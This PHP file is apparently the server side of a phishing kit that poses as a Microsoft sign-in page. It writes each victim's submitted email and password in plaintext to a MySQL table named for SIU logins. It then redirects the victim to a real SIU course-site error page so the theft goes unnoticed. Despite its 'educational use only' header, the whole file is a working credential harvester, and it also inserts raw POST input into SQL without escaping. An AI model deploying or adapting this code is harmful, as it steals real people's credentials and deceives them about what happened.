<?php
/*
    Made by Mike Zawisza for educational use only

    this is server side php for the microsoft sign in page for pushing data into SQL server
    can also handles redirecting users and other functions
*/

// database connection code
// $con = mysqli_connect('localhost', 'database_user', 'database_password','database');

$con = mysqli_connect('localhost', 'root', '','db_siu_login');

// get the post records
$emailval = $_POST['emailval'];
$password = $_POST['password'];

// database insert SQL code
$sql = "INSERT INTO `tbl_siu_login` (`id`, `login`, `password`) VALUES ('0', '$emailval', '$password')";

// insert in database 
$rs = mysqli_query($con, $sql);

//this is for debugging/verbose output
/*if($rs)
{
    echo $emailval;
    echo $password;
    echo "Contact Records Inserted";
}*/

//this is used to redirect from the php to a site where the user thinks an error ocurred
header("Location: https://mycourses.siu.edu/d2l/error/403");
die();
?>